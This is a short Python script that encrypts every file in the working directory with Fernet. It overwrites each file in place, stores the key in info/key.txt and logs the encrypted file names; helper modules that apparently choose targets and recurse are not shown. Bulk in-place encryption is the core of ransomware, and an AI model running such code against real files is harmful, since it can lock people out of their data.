import os
from CryptClass import CryptClass
from redundantHelper import SKIP_WORDS, DEFAULT_DIR, mainLogic

crypt = CryptClass(loopFileSkip = SKIP_WORDS)
crypt.createRequiredFiles()
fernet = crypt.returnFernet()

dirFiles = os.listdir()

crypt.writeFile('info/key.txt', crypt.getKey(), False)



def encryptFile(file: str, isImage: bool, isTxt: bool) -> None:
   if isImage:
      content = crypt.getContent(file, True)

   elif isTxt:
      content = crypt.getContent(file)

   encrypted = fernet.encrypt(content)
   crypt.writeFile(file, encrypted, False)

   cd = os.getcwd()

   os.chdir(DEFAULT_DIR)
   crypt.writeFile('info/encryptedFiles.txt', file, True)
   os.chdir(cd)



def init(file: str) -> None:
   mainLogic(crypt, file, init, encryptFile)



for file in dirFiles:
   init(file)

   os.chdir(DEFAULT_DIR)